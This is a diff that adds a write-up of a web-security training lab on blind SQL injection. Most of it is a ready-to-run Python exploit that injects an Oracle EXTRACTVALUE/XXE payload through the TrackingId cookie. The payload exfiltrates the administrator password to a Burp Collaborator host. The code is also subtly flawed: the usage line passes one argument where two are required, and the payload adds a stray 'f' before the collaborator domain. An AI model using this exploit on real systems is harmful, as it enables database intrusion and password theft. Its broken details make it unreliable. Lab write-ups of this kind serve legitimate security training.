@@ -1,0 +1,125 @@
+---
+title: 'SQLi Lab 17'
+description: 'Blind SQL injection to extract administrator password using Burp Collaborator'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Blind SQL injection with out-of-band data exfiltration
+
+<div style="text-align: justify;">
+  This lab demonstrates exploiting a blind SQL injection (SQLi) vulnerability via a tracking cookie. The application executes the SQL query asynchronously, so the response does not contain query results. However, out-of-band (OOB) interactions with an external domain can be triggered to retrieve sensitive data.
+
+  By modifying the `TrackingId` cookie and leveraging Burp Collaborator, I was able to extract the administrator's password from the `users` table. The asynchronous behavior requires polling Collaborator for DNS or HTTP interactions to view the exfiltrated data.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The `TrackingId` cookie is vulnerable to blind SQL injection.
+- Payloads use `UNION SELECT` and `EXTRACTVALUE` with an embedded XML/XXE structure to trigger OOB interactions.
+- A Burp Collaborator subdomain is used to capture the exfiltrated administrator password.
+- Polling the Collaborator tab shows DNS and HTTP interactions that reveal the password.
+- Once obtained, the administrator password is used to log in to the application.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+#!/usr/bin/env python3
+"""
+oob_sqli_exfil.py
+
+Exploit Blind SQL Injection with Out-of-Band (OOB) data exfiltration.
+This leaks the administrator password in a DNS/HTTP request to Burp Collaborator.
+
+Usage:
+    python oob_sqli_exfil.py <url> <collaborator-subdomain>
+
+Example:
+    python oob_sqli_exfil.py https://target.lab pa3gw5qad0jn77hef0jikr54vv1mpdd2.oastify.com
+"""
+
+import sys
+import requests
+import urllib3
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Optional: Proxy through Burp (set {} if not needed)
+proxies = {"http": "http://127.0.0.1:8080",
+           "https": "http://127.0.0.1:8080"}
+
+
+def grab_initial_cookies(url: str):
+    """Fetch initial cookies from target lab."""
+    r = requests.get(url, verify=False, proxies=proxies, timeout=15)
+    tracking_id = r.cookies.get("TrackingId")
+    session_cookie = r.cookies.get("session")
+
+    if not tracking_id or not session_cookie:
+        print("[-] Failed to grab TrackingId/session cookie.")
+        sys.exit(1)
+
+    return tracking_id, session_cookie
+
+
+def build_payload(collab_subdomain: str) -> str:
+    """
+    Build SQLi payload to exfiltrate administrator password
+    into a DNS/HTTP request to Burp Collaborator.
+    """
+    return (
+        f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.f{collab_subdomain}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"
+    )
+
+
+def send_payload(url: str, session_cookie: str, payload: str):
+    """Send malicious TrackingId cookie with OOB exfil payload."""
+    cookies = {
+        "TrackingId": payload,
+        "session": session_cookie
+    }
+    print("[*] Sending payload...")
+    try:
+        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=10)
+        print(f"[+] HTTP {r.status_code} received. Now check your Collaborator tab.")
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Request failed: {e}")
+
+
+def main():
+    if len(sys.argv) != 3:
+        print("Usage: python oob_sqli_exfil.py <url> <collaborator-subdomain>")
+        sys.exit(1)
+
+    url = sys.argv[1].rstrip("/")
+    collab = sys.argv[2].rstrip("/")
+
+    print(f"[*] Target: {url}")
+    print(f"[*] Collaborator: {collab}")
+
+    tracking_id, session_cookie = grab_initial_cookies(url)
+    print(f"[*] Got TrackingId: {tracking_id}")
+    print(f"[*] Got session: {session_cookie}")
+
+    payload = build_payload(collab)
+    send_payload(url, session_cookie, payload)
+
+    print("\n[*] Payload sent!")
+    print("    → Open Burp → Collaborator tab → Poll now.")
+    print("    → Look for a DNS/HTTP request with the password in the subdomain.")
+    print("    → Use that password to log in as administrator ✅.")
+
+
+if __name__ == "__main__":
+    main()
+```
